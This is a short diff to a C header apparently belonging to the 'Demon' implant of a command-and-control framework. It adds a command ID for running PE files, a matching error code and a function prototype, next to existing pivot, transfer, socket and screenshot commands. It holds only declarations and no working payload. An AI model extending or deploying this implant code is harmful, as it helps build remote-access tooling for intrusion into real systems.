@@ -26,6 +26,7 @@
 #define DEMON_COMMAND_PIVOT                     2520
 #define DEMON_COMMAND_TRANSFER                  2530
 #define DEMON_COMMAND_SOCKET                    2540
+#define DEMON_COMMAND_RUN_PE                    2550
 
 #define DEMON_INFO                      89
 #define DEMON_OUTPUT                    90
@@ -42,6 +43,7 @@
 #define CALLBACK_ERROR_WIN32            0x1
 #define CALLBACK_ERROR_COFFEXEC         0x2
 #define CALLBACK_ERROR_TOKEN            0x3
+#define CALLBACK_ERROR_PEEXEC           0x4
 
 // Config options
 #define DEMON_CONFIG_SHOW_ALL                0
@@ -108,6 +110,7 @@ VOID CommandDotnet( PPARSER Parser );
 VOID CommandAssemblyInlineExecute( PPARSER DataArgs );
 VOID CommandAssemblyListVersion( VOID );
 VOID CommandScreenshot( PPARSER Parser );
+VOID CommandRunPe( PPARSER Parser );
 
 // Modules
 VOID CommandConfig( PPARSER Parser );
